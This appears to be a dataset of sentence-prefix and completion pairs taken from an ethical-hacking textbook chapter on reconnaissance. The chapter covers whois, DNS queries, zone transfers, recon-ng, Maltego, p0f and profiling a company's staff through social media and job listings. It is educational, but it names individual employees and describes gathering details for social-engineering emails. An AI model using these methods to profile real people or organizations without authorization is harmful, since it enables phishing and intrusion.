"there are a number of tools that can be used to automate the collection of information , and we","there are a number of tools that can be used to automate the collection of information , and we ’ ll cover their use as part of looking at how to gather open-source intelligence about companies and people"
"even in cases where privacy settings are locked down ,","even in cases where privacy settings are locked down , there is still a lot of information that can be gathered"
companies there are several starting points when it,companies there are several starting points when it comes to acquiring open-source intelligence about your target
the reason it can be harder is that companies recognize that the more,"the reason it can be harder is that companies recognize that the more information they provide , the more that information can be used against them"
"sometimes , these resources can be used to gather","sometimes , these resources can be used to gather information that may be used for social engineering attacks"
details about a company and its organizational and governance structure can come from a,"details about a company and its organizational and governance structure can come from a database maintained by the united states government , in the case of businesses registered here"
details about the busi-ness network may come from databases maintained,details about the busi-ness network may come from databases maintained by the organizations that are respon-sible for governance of the internet
"the organizational structure can tell you who has what position , so when you are working on sending","the organizational structure can tell you who has what position , so when you are working on sending out email messages to gather additional information later on , you know who they should appear to be from"
the securities and exchange commission ( sec ) has a,the securities and exchange commission ( sec ) has a database that stores all public filings associated with a company
"the electronic data gathering , analysis , and retrieval ( edgar ) system can be","the electronic data gathering , analysis , and retrieval ( edgar ) system can be used to look up public filings such as the annual report in the form 10-k"
"1 edgar site one of the most useful forms you can find in edgar is schedule 14-a , which is a","1 edgar site one of the most useful forms you can find in edgar is schedule 14-a , which is a proxy statement and will include the annual report to the shareholders , which may include a lot of useful information for you"
other sections that are not shown include corporate governance at,"other sections that are not shown include corporate governance at microsoft , board of directors , and audit committee matters"
"while at a high level , what is included in these reports will be the same across all public","while at a high level , what is included in these reports will be the same across all public companies , there may be some companies that present more in the way of specific details than other companies"
you won ’ t get the same sort of information from the domain registrars as,"you won ’ t get the same sort of information from the domain registrars as you would from edgar , but it ’ s still sometimes a decent source of information"
"when you ask for information , you will get what the","when you ask for information , you will get what the registrar has been asked to present and not neces-sarily the real details"
"in fact , there have been times i have","in fact , there have been times i have had domains registered with bogus phone numbers and incorrect addresses"
"before we get too far down this road , though , it ’ s probably useful","before we get too far down this road , though , it ’ s probably useful for you to understand how the internet is governed when it comes to domains and addresses"
"underneath icann is the internet assigned numbers authority ( iana ) , which is responsible for managing","underneath icann is the internet assigned numbers authority ( iana ) , which is responsible for managing ip addresses , ports , protocols , and other essential numbers associated with the function-ing of the internet"
"prior to the establishment of icann in 1998 , iana ’ s functions were managed by","prior to the establishment of icann in 1998 , iana ’ s functions were managed by one man , jon postel , who also maintained the request for comments ( rfc ) documents"
in order to grab information out of the regional internet,"in order to grab information out of the regional internet registry ( rir ) , you would use the whois program"
this is a program that can be used on the,"this is a program that can be used on the command line on most unix-like systems , including linux and macos"
there are also websites that have implementa-tions of whois,there are also websites that have implementa-tions of whois if you don ’ t have a unix-like system handy
com % iana whois server % for more information on iana,"com % iana whois server % for more information on iana , visit url this query returned 1 object refer : whois"
comupdated date : 2017-10-07t05:19:30zcreation date : 1994-10-12t04:00:00zregistrar registration expiration,"comupdated date : 2017-10-07t05:19:30zcreation date : 1994-10-12t04:00:00zregistrar registration expiration date : 2019-10-11t04:00:00zregistrar : csc corporate domains , inc"
"8887802723domain status : clienttransferprohibited url registrant id : registrant name : domain administratorregistrant organization : john wiley & sons , incregistrant","8887802723domain status : clienttransferprohibited url registrant id : registrant name : domain administratorregistrant organization : john wiley & sons , incregistrant street : 111 river streetregistrant city : hobokenregistrant state/province : njregistrant postal code : 07030registrant country : usregistrant phone : +1"
"comregistry admin id : admin name : domain administratoradmin organization : john wiley & sons , incadmin street :","comregistry admin id : admin name : domain administratoradmin organization : john wiley & sons , incadmin street : 111 river streetadmin city : hobokenadmin state/province : njadmin postal code : 07030admin country : usadmin phone : +1"
"com there is a lot of output there to look through , and i","com there is a lot of output there to look through , and i ’ ve snipped out a bunch of it to keep it to really relevant information"
"first , whois checks with iana ’ s whois server to","first , whois checks with iana ’ s whois server to figure out who it needs to check with about this specific domain"
"after that , and a lot of information being snipped","after that , and a lot of information being snipped out , we finally get the details about the domain wiley"
org registry registrant id : redacted for privacy registrant name : redacted for privacyregistrant organization : the spamhaus projectregistrant street : redacted for privacyregistrant city : redacted for privacyregistrant state/province : registrant,org registry registrant id : redacted for privacy registrant name : redacted for privacyregistrant organization : the spamhaus projectregistrant street : redacted for privacyregistrant city : redacted for privacyregistrant state/province : registrant postal code : redacted for privacyregistrant country : chregistrant phone : redacted for privacyregistrant phone ext : registrant fax : redacted for privacyregistrant fax ext : registrant email : 26a6047fb7bb1b2a0e5ea9927ed7f15c-666344 @ contact
net using a strategy like this will keep information private,net using a strategy like this will keep information private and out of the hands of the very people spamhaus
it can also be used to create a physical mailing list,it can also be used to create a physical mailing list for traditional junk mail providers ( sometimes called mail marketing companies )
regional internet registries not all the useful information,"regional internet registries not all the useful information is stored with the domain registrars , however"
"while the iana server provided information about domain registrars , its","while the iana server provided information about domain registrars , its purpose has long been to be a central clearinghouse for addresses"
"they are based in different geographic regions , and an organization would","they are based in different geographic regions , and an organization would refer to the rir where they are located for things like ip addresses"
african network information center ( afrinic ) africa american registry for internet numbers ( arin ),african network information center ( afrinic ) africa american registry for internet numbers ( arin ) north america ( us and canada ) as well as antarctica and parts of the caribbean
"asia pacific network information centre ( apnic ) asia , australia , new zealand , and neighboring countrieslatin america and caribbean network information centre ( lacnic ) latin america and parts of the caribbeanréseaux ip européens network coordination centre (","asia pacific network information centre ( apnic ) asia , australia , new zealand , and neighboring countrieslatin america and caribbean network information centre ( lacnic ) latin america and parts of the caribbeanréseaux ip européens network coordination centre ( ripe ncc ) europe , russia , west asia , and central asia all of these rirs have their own databases that can be queried using whois , just as we used whois to query information from the domain registrars"
"com earlier , part of the output indicated which name","com earlier , part of the output indicated which name servers the domain uses to resolve hostnames to ip addresses"
with a minimal amount of effort ( we will cover the dns,"with a minimal amount of effort ( we will cover the dns later in the chapter ) , we can discover that the hostname ns"
19 % iana whois server % for more information on iana,"19 % iana whois server % for more information on iana , visit url this query returned 1 object refer : whois"
"0/18descr : uk pa routeorigin : as702member-of : as702 : rs-uk , as702 : rs-uk-painject : upon staticaggr-mtd","0/18descr : uk pa routeorigin : as702member-of : as702 : rs-uk , as702 : rs-uk-painject : upon staticaggr-mtd : outboundmnt-by : wcom-emea-rice-mntcreated : 2018-04-16t14:25:12zlast-modified : 2018-04-16t14:25:12zsource : ripe this provides us with a lot of useful information"
you can see that the address for john wiley & sons is,"you can see that the address for john wiley & sons is in great britain , which matches up with the rir being ripe"
"the business is located in england , so the","the business is located in england , so the cor-responding regional registry is the one responsible for europe"
this is a script that will search through different sources to,this is a script that will search through different sources to locate contact information based on a domain name provided to the program
"another source that can be used , that may not be considered","another source that can be used , that may not be considered a lot , is a pretty good privacy ( pgp ) key server"
"without these , the public key has to be shared manually","without these , the public key has to be shared manually by anyone who wants to get an encrypted message from someone else"
"since they are associated with email addresses , you","since they are associated with email addresses , you can search for email addresses on the key server"
"since some of my email addresses have been around for more than 20 years , and since i ’","since some of my email addresses have been around for more than 20 years , and since i ’ ve generally had a habit of rebuilding machines without storing off encryption keys , i have a few pgp keys"
doing the same search at url ( mit ’ s site,doing the same search at url ( mit ’ s site was unresponsive for this search ) resulted in a handful of results
com resulted in a number of people whose first name was wiley,"com resulted in a number of people whose first name was wiley , while the domain name their email address was in ended in"
"using the mit site to search for my own keys , i turned","using the mit site to search for my own keys , i turned up all the keys i have loaded into the key servers over the years"
this is a way to look up information about individual people if,"this is a way to look up information about individual people if you need to , since theharvester requires that you provide a domain name"
"as i said , i had a habit of rebuilding","as i said , i had a habit of rebuilding or moving to differ-ent machines without ever storing my private key"
"it ’ s possible , after all , i could have","it ’ s possible , after all , i could have a few legitimate keys that are all used on different systems"
3 pgp key server search while tools like theharvester are good for identifying information,"3 pgp key server search while tools like theharvester are good for identifying information about people at a company automatically , you may want or need to go deeper"
"for example , using my name turns up a handful of posts to","for example , using my name turns up a handful of posts to mailing lists , as well as a twitter account i don ’ t use"
"this username could be found across multiple social net-work sites , as","this username could be found across multiple social net-work sites , as well as other locations where a username is exposed to the outside world"
a search for a username i have used in the past turned up,"a search for a username i have used in the past turned up a few hits , though the information was badly out of date and inconsistent"
they come in a number of different fla-vors and have been around,"they come in a number of different fla-vors and have been around for more than two decades , with the first one , sixdegrees"
"facebook has allowed users to create communities , share news and information","facebook has allowed users to create communities , share news and information , and get back in touch with people they have fallen away from"
"twitter is often useful for news and updates ,","twitter is often useful for news and updates , as well as marketing information—making announcements , for example"
in addition to using traditional search sites like google and bing,"in addition to using traditional search sites like google and bing , theharvester will also search through some of the social network sites"
"finally , we have a tool like maltego , which is good for open-source intelligence in general ,","finally , we have a tool like maltego , which is good for open-source intelligence in general , though there are ways it can be used to search social network sites for details about people and companies"
facebook while sites that may primarily be thought of as personal sites may focus more on,"facebook while sites that may primarily be thought of as personal sites may focus more on indi - viduals , they are still useful for someone doing work as an ethical hacker"
a site like facebook is interesting because people seem to let their guard,"a site like facebook is interesting because people seem to let their guard down there , posting a lot of details that perhaps they shouldn ’ t"
"over time , facebook has vastly improved how much infor -","over time , facebook has vastly improved how much infor - mation can be acquired , though it ’ s still not great"
"com , that searched through facebook posts that would fall into one of four categories—who wants to get fired","com , that searched through facebook posts that would fall into one of four categories—who wants to get fired , who is hungover , who is tak - ing drugs , and who has a new phone number"
5 shows some of the posts from the site before it got taken down,5 shows some of the posts from the site before it got taken down because the application programming interface ( api ) it used is no longer available
"besides the information you can see about its location , there are several","besides the information you can see about its location , there are several other categories of information , such as reviews , posts , and community"
"the reviews can sometimes provide enlightening information , and","the reviews can sometimes provide enlightening information , and of course , there is the contact information provided"
7 john wiley & sons information you don ’ t have,"7 john wiley & sons information you don ’ t have to rely on just looking up business information in facebook , though"
"you can ’ t , after all , just search","you can ’ t , after all , just search for all employees of a particular company using the usual search"
"however , if you have found some names of employees using other means ,","however , if you have found some names of employees using other means , you can use those names to find their pages and read their status posts"
"often , people will include details of their work situation—companies they","often , people will include details of their work situation—companies they do work for and have worked for—as part of their profile"
"this is not always done , which means you can probably","this is not always done , which means you can probably read the posts of a lot of people you are looking for"
in an age of social media and the expectation that you can find out just about anything you,"in an age of social media and the expectation that you can find out just about anything you want about someone , people often don ’ t think about who can potentially see their posts and photos"
"8 facebook permissions settings sometimes , people will post a status about their job , including what","8 facebook permissions settings sometimes , people will post a status about their job , including what they may have been doing that day , or they may check in at another job site"
"however , sites like facebook are not always the","however , sites like facebook are not always the best place to get information about businesses and their employees"
in spite of a number of competitors ( such as plaxo ) going out,"in spite of a number of competitors ( such as plaxo ) going out of business or just no longer being in the space , linkedin is still around"
it continues to expand its offerings beyond the very,"it continues to expand its offerings beyond the very early days , when it was basically a contact manager"
"it seems like human resources people , spe- cifically recruiters , commonly use linkedin to find people to","it seems like human resources people , spe- cifically recruiters , commonly use linkedin to find people to fill positions , whether it ’ s an internal recruiter or someone who works for a recruiting company"
"because of the amount of business information linkedin collects ,","because of the amount of business information linkedin collects , we can make use of it as a hunting platform"
"especially with the paid memberships , linkedin does a lot of ana-lytics about the businesses","especially with the paid memberships , linkedin does a lot of ana-lytics about the businesses that make use of it , as well as the people who are on the site"
9 shows some statistics about applicants for a position that,9 shows some statistics about applicants for a position that is open and advertised through the jobs section of the website
you can start to get a sense for the,you can start to get a sense for the workforce by looking at these sta-tistics across multiple positions
9 linkedin job statistics job listings are another place to look,9 linkedin job statistics job listings are another place to look for details beyond the statistics about applicants and the workforce overall
"while some of these requirements are generic , there are also some","while some of these requirements are generic , there are also some that are very specific about the technology in use in the network"
"cisco devices , for sure , have tools that can","cisco devices , for sure , have tools that can be run against them for various auditing and attack purposes"
10 job requirements for a network security engineer we don ’ t have to limit ourselves to the,"10 job requirements for a network security engineer we don ’ t have to limit ourselves to the web interface , though , since it can be tedious to keep typing things and flicking through pages"
"it ’ s a python script , though , that can be","it ’ s a python script , though , that can be run from anywhere if you want to download it to another system"
if you provide a text file with the technology you want to look for,"if you provide a text file with the technology you want to look for , inspy will look for jobs at a company you specify that match those technologies"
another is that even if job descriptions don ’ t have information about,"another is that even if job descriptions don ’ t have information about technology , when people post their job responsibilities , they very often do"
"someone with a load of cisco certifications , for example , is","someone with a load of cisco certifications , for example , is probably employed at a company that has a lot of cisco equipment"
you may get information about telephone systems and document manage-ment systems that,"you may get information about telephone systems and document manage-ment systems that the company uses , even if the employee isn ’ t an administrator"
the text file i am using for our little foray here,"the text file i am using for our little foray here just has the words engineer , editor , and analyst in it"
"this particular search returned 59 people , so only some of them are shown","this particular search returned 59 people , so only some of them are shown here just to give you a sense of the types of responses you can get"
avaya voice engineer – voice infrastructure 2018-07-02 16:00:52 uta goebel,avaya voice engineer – voice infrastructure 2018-07-02 16:00:52 uta goebel deputy editor at wiley vch2018-07-02 16:00:52 janice cruz ( l
"instead of search sites like google or bing , we","instead of search sites like google or bing , we can indicate linkedin as the data source to search in"
"you can search using the regular interface , but it","you can search using the regular interface , but it ’ s sometimes helpful to be able to use other tools"
you can easily tell twitter you are creating an application,you can easily tell twitter you are creating an application without any special credentials through the twitter developer ’ s website
"when you go through the process to create an application , what you are","when you go through the process to create an application , what you are doing is creating identification information that your app needs to interact with the twitter service"
the reason for this is that i created the app just to get the key and token,"the reason for this is that i created the app just to get the key and token so i could add it into recon-ng , a tool used for reconnaissance that includes many plug-ins"
some of these plug-ins require api keys or access tokens in,some of these plug-ins require api keys or access tokens in order to be able to interact with the service being queried
"in the following code , you can see the list of","in the following code , you can see the list of api keys that recon-ng uses and the api keys set for twitter"
"in order to run the module , we have to “ use ”","in order to run the module , we have to “ use ” it , meaning we load the module with the use com - mand"
"in our case , the source is a text string , so it ’ s","in our case , the source is a text string , so it ’ s in quotes , telling recon-ng that we are using a text string for the source"
the results from the mod-ule are truncated because there were quite a few,the results from the mod-ule are truncated because there were quite a few of them and this is just to show you how to use the module
you could do the reverse of these results with the twitter_mentioned,"you could do the reverse of these results with the twitter_mentioned module , which returns profiles that are mentioned a given handle"
"finally , we can look for tweets that happened","finally , we can look for tweets that happened in a given geographic area using the locations-pushpin/twitter module"
"there is another tool that ’ s useful for reconnaissance overall , but since","there is another tool that ’ s useful for reconnaissance overall , but since it has twitter abilities , we ’ ll take a look at it here"
it can be useful to have entity relationships,"it can be useful to have entity relationships identified , like parent/child relationships between pieces of data"
this is because every piece of data collected can,"this is because every piece of data collected can potentially yield another piece , which would be a child"
@ defenseit # bestcasestudy # coderanch # coderanch url maltego can be a good,"@ defenseit # bestcasestudy # coderanch # coderanch url maltego can be a good tool to collect reconnaissance data , especially if you want a visual representation of it"
"while there are several other tools that can collect the same data maltego does , maltego does have the advantage of giving you a quick","while there are several other tools that can collect the same data maltego does , maltego does have the advantage of giving you a quick way to collect addi-tional data by just selecting a node on the graph and running a transform on it to pivot to another data collection tool"
"you can start with a hostname , for instance , and","you can start with a hostname , for instance , and collect an ip address from it by just running a transform"
"this will provide a lot of capability , in addition to","this will provide a lot of capability , in addition to all of the other capabilities , to search twitter from inside maltego"
use maltego to locate as much information about yourself,use maltego to locate as much information about yourself as you can using the machines and transforms available
one area of information we were able to gather from linkedin was job descriptions,"one area of information we were able to gather from linkedin was job descriptions , leading to some insights about what technology is being used at some organizations"
13 job listing with technologies if you wanted to try to do something through,"13 job listing with technologies if you wanted to try to do something through the web application , you know they are using restful interfaces for the application"
"as you look over job listings , you start to be","as you look over job listings , you start to be able to read them with an eye toward picking out potential targets"
"after you ’ ve been reading them for a while , you","after you ’ ve been reading them for a while , you will start to pick out some of the language of these listings"
while you can ’ t get a complete line on what is used,"while you can ’ t get a complete line on what is used , you can certainly rule some things out , as we did earlier"
"while in the old days , we used newspapers , and you ’ d have to get a newspaper in the region you wanted to","while in the old days , we used newspapers , and you ’ d have to get a newspaper in the region you wanted to look for a job in ( or scare up information about a company you were trying to research ) , now job post-ings are everywhere online"
"while many companies use the job posting sites , there may be some companies","while many companies use the job posting sites , there may be some companies that post jobs on their own site , and they may not be available elsewhere"
any of these job postings may provide you with,any of these job postings may provide you with some insight into not only technology but also organizational structure
you can gather additional information about the company using,you can gather additional information about the company using other job listings that aren ’ t about technology
domain name system while you can gather a lot of information at,"domain name system while you can gather a lot of information at a distance , at some point , you need to dive in"
"this still doesn ’ t mean you are going fully active , but you ’","this still doesn ’ t mean you are going fully active , but you ’ re going to start gathering details about the scope of what we are dealing with"
"when you interact with systems on your tar-get , and every other","when you interact with systems on your tar-get , and every other system as well , you need to communicate with an ip address"
"it ’ s best to read the hostname from right to left , because that ’ s","it ’ s best to read the hostname from right to left , because that ’ s how dns will read it when it comes time to resolving the hostname to an ip address"
"they have organizations that manage them , but they don ’ t “ belong ” to","they have organizations that manage them , but they don ’ t “ belong ” to any one organization , at least not in the way the second-level domains can be said to"
"when people refer to domains , they generally refer to","when people refer to domains , they generally refer to the second-level domain along with the tld , or domain"
"when we add www , which is the hostname , to the subdomain , the second-level domain ,","when we add www , which is the hostname , to the subdomain , the second-level domain , and the tld , we end up with some-thing called a fully qualifi ed domain name ( fqdn )"
"it ’ s fully qualifi ed because it ’ s clear what domain the hostname belongs to ( the hostname www ,","it ’ s fully qualifi ed because it ’ s clear what domain the hostname belongs to ( the hostname www , for instance , exists in countless domains ) and it ’ s also clear what hostname in the domain we are talking about"
you may recognize the three letters www as standing for,"you may recognize the three letters www as standing for world wide web , which it also stands for here"
now that you have a basic understanding of the naming structure used within dns and a basic understanding of what,"now that you have a basic understanding of the naming structure used within dns and a basic understanding of what dns is used for , we can start looking at how you might use dns to gather information about your targets"
"this includes how a name lookup actually works , and then we ’","this includes how a name lookup actually works , and then we ’ ll look at some tools that can be used to perform the name lookups"
"name lookups when you visit a website , you","name lookups when you visit a website , you enter something called a uniform resource locator ( url )"
your browser will issue a request to the operating system to open,your browser will issue a request to the operating system to open a connection to the fqdn at the port indicated by the uri
"before the connection can be opened , however , the system needs","before the connection can be opened , however , the system needs to have an ip address to put into the layer 3 headers"
your system will commonly cache the resolved address so it,your system will commonly cache the resolved address so it doesn ’ t have to generate network traffic to ask again
"similarly , the resolver your system asks will also generally cache results","similarly , the resolver your system asks will also generally cache results so it doesn ’ t have to keep asking its authoritative server"
we similarly assume that no other system using the same,"we similarly assume that no other system using the same resolver has requested the information , resulting in a fresh request"
this is distinct from what is known as an authorita-tive,"this is distinct from what is known as an authorita-tive server , which holds the records for a given domain"
"so , the very fi rst dns request is the one from","so , the very fi rst dns request is the one from your system to the caching server , wherever it happens to be located"
14 shows a basic fl ow of how a complete dns,"14 shows a basic fl ow of how a complete dns name resolution would work , so you can follow along there"
the caching dns server checks its cache and sees that it has no ip address,"the caching dns server checks its cache and sees that it has no ip address stored , so it begins something called a recursive name query or recursive name resolution"
it ’ s called recursive because it will end up with multiple,it ’ s called recursive because it will end up with multiple requests that keep getting narrower until we end up with what we want
"once it has identi-fied the server it needs to send a request to , request b goes","once it has identi-fied the server it needs to send a request to , request b goes out , asking the root server for the ip address of the name server for the domain"
the root server has the name server details for all of,the root server has the name server details for all of the domains that fall under the tld it is responsible for
"when we did the whois lookups earlier , at the very end of a whois lookup on a","when we did the whois lookups earlier , at the very end of a whois lookup on a domain will be the name servers for that domain , since the name servers are stored with the domain"
we can ’ t just ask the root server for the ip address of the,"we can ’ t just ask the root server for the ip address of the hostname , so we have to ask it for a pointer to who to ask next"
"the authoritative server , which is the one we are asking because it","the authoritative server , which is the one we are asking because it has the authoritative information about that domain , responds with the ip address"
"it may actually respond with multiple ip addresses , but for our purposes ,","it may actually respond with multiple ip addresses , but for our purposes , we ’ re going to just say it comes back with a single ip"
"once the caching server has the ip , it sends the response back to our system , which can","once the caching server has the ip , it sends the response back to our system , which can then issue request e , which isn ’ t a dns request but a connection request to the web server"
now that you have a handle on the process we are going through to get ip addresses,"now that you have a handle on the process we are going through to get ip addresses back from dns servers , we can start looking at tools we can use to get those addresses"
"in addition to just a straightforward lookup of a hostname to an ip address ,","in addition to just a straightforward lookup of a hostname to an ip address , we can use a different server than the one that is defined as our resolver"
it was created by gte internetworking and has been around for at,it was created by gte internetworking and has been around for at least the better part of a couple of decades at this point
"since it is also a caching server that is open for anyone to use , we can issue requests to","since it is also a caching server that is open for anyone to use , we can issue requests to it and it will go through the same process described earlier , just as if it were our own caching server"
this means that requests can be issued to the dns server for an address block to do some - thing called,"this means that requests can be issued to the dns server for an address block to do some - thing called a reverse lookup , meaning that we have an ip address and we want the hostname that ’ s associated with it"
this may be the case where a web server is hosting virtual servers—meaning the web,this may be the case where a web server is hosting virtual servers—meaning the web server can determine what content to serve up based on the hostname in the request
"an advantage to nslookup , however , is that you","an advantage to nslookup , however , is that you can issue many requests without having to keep running nslookup"
"when you run nslookup without any parameters , you will be placed into","when you run nslookup without any parameters , you will be placed into an nslookup shell , where you are interacting with the program , issuing requests"
we are ultimately looking for the same information as we got earlier,"we are ultimately looking for the same information as we got earlier using host , but we are going about it in a different manner"
"when you see set type=ns , i ’ m telling nslookup","when you see set type=ns , i ’ m telling nslookup to issue subsequent requests asking for name server ( ns ) records"
"what this means is that instead of going to my caching server , nslookup is going to issue a dns request directly","what this means is that instead of going to my caching server , nslookup is going to issue a dns request directly to the authoritative server , which wouldn ’ t have to do any recursive search since it has the information being requested"
"it also supports the same things we have been doing , meaning","it also supports the same things we have been doing , meaning we can indicate a different name server and also request different resource records"
"the command line has all of the information for the request , including the resource","the command line has all of the information for the request , including the resource record type , the request , and also the server dig should issue the request to"
"com ; ; global options : +cmd ; ; got answer : ; ; - > > header < < - opcode : query , status : noerror , id : 37337 ;","com ; ; global options : +cmd ; ; got answer : ; ; - > > header < < - opcode : query , status : noerror , id : 37337 ; ; warning : recursion requested but not available ; ; opt pseudosection : ; edns : version : 0 , flags : ; udp : 4096 ; ; question section : ; sybex"
53 ) ; ; when : wed jul 04 21:03:11 mdt 2018 ; ; msg size rcvd,53 ) ; ; when : wed jul 04 21:03:11 mdt 2018 ; ; msg size rcvd : 149 the response is quite a bit more detailed than we ’ ve seen so far
"you can compare that to what you asked for , in case","you can compare that to what you asked for , in case there is any confusion based on what you specified on the command line"
the dns server will respond with a list of all the,the dns server will respond with a list of all the mail servers that have been configured in dns for that domain
"when you want to send email to someone , your mail server will issue a","when you want to send email to someone , your mail server will issue a dns request asking which mail server it should be sending mail to for the domain requested"
"if , for whatever reason , you can ’ t reach that mail server , you move on to","if , for whatever reason , you can ’ t reach that mail server , you move on to the next one and so on until you run out of mail servers and have to fail the message"
"in most cases , applications are asking for the information","in most cases , applications are asking for the information about ip addresses from hostnames so the appli-cation can function correctly"
"in our case , as ethical hackers , we are","in our case , as ethical hackers , we are sometimes looking for all the hostnames that belong to a domain"
the secondary servers would issue a zone transfer,the secondary servers would issue a zone transfer request to the primary and update their records accordingly
"first , most domains you will run across won ’ t allow","first , most domains you will run across won ’ t allow zone transfers from anyone other than the secondary nss that have been configured"
split dns is where the outside world is given an authoritative server address to,"split dns is where the outside world is given an authoritative server address to use for externally resolv-able hosts , like the web server and the mail server"
any system inside the enterprise network would use the company resolver,"any system inside the enterprise network would use the company resolver , which would be configured as authoritative for the corpo-rate domain"
this means it can have many other systems that are not known or,this means it can have many other systems that are not known or available to the outside world but that internal systems can resolve and connect to
"in order to issue a zone transfer request , you can use","in order to issue a zone transfer request , you can use the utilities we ’ ve already been using , though there are others"
"51 ) ; ; when : thu jul 05 10:15:27 mdt 2018 ; ; xfr size : 9 records ( messages 1 , bytes 243","51 ) ; ; when : thu jul 05 10:15:27 mdt 2018 ; ; xfr size : 9 records ( messages 1 , bytes 243 ) brute force as zone transfers are generally disallowed , you may have to rely on less elegant solutions to gather information about your target"
"additionally , it can be used to identify hostnames as a","additionally , it can be used to identify hostnames as a result of repeated requests based on a wordlist provided to the program"
"the cname refers to another hostname , and that","the cname refers to another hostname , and that hostname is then resolved until there is an ip address"
"identify , using some of the techniques described in the","identify , using some of the techniques described in the preceding sections , some of the hosts associated with the domain"
keep track of all the ip addresses and address blocks,keep track of all the ip addresses and address blocks owned by the company or organization associ-ated with the domain
"for example , watch- ing the network headers as they go by , from","for example , watch- ing the network headers as they go by , from the layer 3 headers to the application headers , can turn up some interesting information"
while it can be very time-consuming to capture packets and try to read through them,"while it can be very time-consuming to capture packets and try to read through them manually , there is a program that will do a lot of that work for us"
"the program is p0f , and it will sit and watch network traffic","the program is p0f , and it will sit and watch network traffic as it passes by the interface , making observations as the traffic passes"
the reason for that has nothing to do with p0f but more to do with the fact that web servers are generally,"the reason for that has nothing to do with p0f but more to do with the fact that web servers are generally encrypting traffic by default , which means p0f can ’ t watch the http headers , identifying the server and other useful information"
"11 and newer| dist = 0| params = none| raw_sig = 4:64+0:0:1460 : mss * 20,7","11 and newer| dist = 0| params = none| raw_sig = 4:64+0:0:1460 : mss * 20,7 : mss , sok , ts , nop , ws : df , id+:0| ` -- --"
"11 and newer| dist = 0| params = none| raw_sig = 4:64+0:0:1460 : mss * 20,7","11 and newer| dist = 0| params = none| raw_sig = 4:64+0:0:1460 : mss * 20,7 : mss , sok , ts , nop , ws : df , id+:0| ` -- --"
"45/33498| reason = tstamp port| raw_hits = 0,1,1,1| ` -- -- very little of what you see here is","45/33498| reason = tstamp port| raw_hits = 0,1,1,1| ` -- -- very little of what you see here is anything you wouldn ’ t be able to determine your - self if you knew how to read packet headers"
"this is the uptime on systems on my local network , so it ’ s less interesting","this is the uptime on systems on my local network , so it ’ s less interesting , perhaps , than it would be if we could so easily identify uptime on remote systems"
"it happens to be the system that p0f is running on , but it makes the determination based on the network headers since operating systems have different “ sig - natures ” that","it happens to be the system that p0f is running on , but it makes the determination based on the network headers since operating systems have different “ sig - natures ” that are based on how the ip identification number is generated , how the tcp sequence number is generated , how ephemeral port numbers are selected , and other pieces of information p0f can collect"
"while we are talking about passive reconnaissance , we should","while we are talking about passive reconnaissance , we should look at some web-based tools that suggest they do passive reconnaissance"
"one of them was named passive recon , though it hasn","one of them was named passive recon , though it hasn ’ t been updated in years and may not be available"
you will have mul-tiple tabs with edit boxes on them,"you will have mul-tiple tabs with edit boxes on them , expecting input depending on what you want to look up"
"the tab shown is the whois tab , which expects a domain","the tab shown is the whois tab , which expects a domain name or an ip address , just as when we used whois earlier"
"15 recon with r3con you may not be using firefox , though what you ’ ll probably find","15 recon with r3con you may not be using firefox , though what you ’ ll probably find is that the browser that has the majority of plug-ins that are useful for security testing is firefox"
i used to joke that firefox was the browser that was insecure,i used to joke that firefox was the browser that was insecure enough to allow plug-ins access to do all sorts of bad things
plug-ins have been around for firefox much lon-ger than for other,"plug-ins have been around for firefox much lon-ger than for other browsers , so the development community has been around for a while"
"other browsers , like chrome , can be much more restrictive in what they","other browsers , like chrome , can be much more restrictive in what they will allow devel-opers to do , though , which also makes firefox more attractive"
this is much like passive recon in that it provides a,this is much like passive recon in that it provides a context menu when you right-click on a link in a page
the recon menu gives you quick access to look,the recon menu gives you quick access to look up information about the link or word you have selected
"you can do google or bing searches , for example , and recon will open","you can do google or bing searches , for example , and recon will open a new tab or window with the results of a search on what you have selected"
"you can also get translations of words , do package tracking , search video sites , and perform a","you can also get translations of words , do package tracking , search video sites , and perform a number of other quick searches where your selection is passed into the site you have selected from the menu"
"however , this is not at all to say that the","however , this is not at all to say that the information you can get from these tools isn ’ t valuable"
any tool that can save you time and maybe even expose you,any tool that can save you time and maybe even expose you to a new technique you could add to your arsenal is very valuable
companies that may be most prone to need the services of,companies that may be most prone to need the services of an ethical hacker to perform testing will likely have a website
"starting from the very bottom of the stack , we can look","starting from the very bottom of the stack , we can look at what the web server is as well as the operating system"
one way to get some of this information is just to,one way to get some of this information is just to connect to the web server and issue a request to it
"1 301 moved permanently server : cloudfrontdate : fri , 06 jul 2018 22:56:29","1 301 moved permanently server : cloudfrontdate : fri , 06 jul 2018 22:56:29 gmtcontent-type : text/htmlcontent-length : 183connection : keep-alivelocation : url redirect from cloudfrontvia : 1"
net ( cloudfront ) x-amz-cf-id : s_fz4mwkj9wy_aw24hhf3ycvvngnnrfu6t52dgnjyc74o0iswv7suw== there,net ( cloudfront ) x-amz-cf-id : s_fz4mwkj9wy_aw24hhf3ycvvngnnrfu6t52dgnjyc74o0iswv7suw== there is actually an easier way to do this
"in 2001 , the site was hosted on an openbsd system ( netcraft says","in 2001 , the site was hosted on an openbsd system ( netcraft says netbsd/openbsd but since i was hosting it myself , i know it was openbsd )"
"16 netcraft hosting history while the history is interesting , it ’ s","16 netcraft hosting history while the history is interesting , it ’ s far more relevant to know what the technology for the website is now"
"that suggests that microsoft is host - ing this site , and","that suggests that microsoft is host - ing this site , and since it ’ s iis , the operating system would be windows server"
"if we have some hints about ver - sions , we would have a","if we have some hints about ver - sions , we would have a much better idea what vulnerabilities exist on the system where the website is hosted"
"static pages are written in html , but it ’ s far","static pages are written in html , but it ’ s far more likely that you ’ ll be running up against a dynamic site"
the language itself isn ’ t enough to provide,the language itself isn ’ t enough to provide the deep functionality needed by a robust web application
"the frameworks can have vulnerabilities , as exhibited by the experian data breach","the frameworks can have vulnerabilities , as exhibited by the experian data breach , which used a vulnerability in the spring framework used by java-based applications"
"however , visiting cnn turns up a lot of different","however , visiting cnn turns up a lot of different technologies , some of which you can see in figure 4"
17 wappalyzer for technology there are other ways you,17 wappalyzer for technology there are other ways you can dig into web pages and the technologies used
"using either the chrome developer tools or firebug , you can","using either the chrome developer tools or firebug , you can perform a deep investigation of the page you are looking at"
you can also select different html elements in the,you can also select different html elements in the page and identify styles and properties applicable to that section
"using a tool like this , you can get a better understanding of how the page","using a tool like this , you can get a better understanding of how the page operates by look-ing at all the elements of the page and how they relate to one another"
"with it stored locally , you could look at the pages as many times","with it stored locally , you could look at the pages as many times as you would like without needing to issue repeated requests to the remote server"
while the requests aren ’ t likely to raise any eyebrows and aren ’,"while the requests aren ’ t likely to raise any eyebrows and aren ’ t even likely to be noticed , you are leav - ing tracks behind"
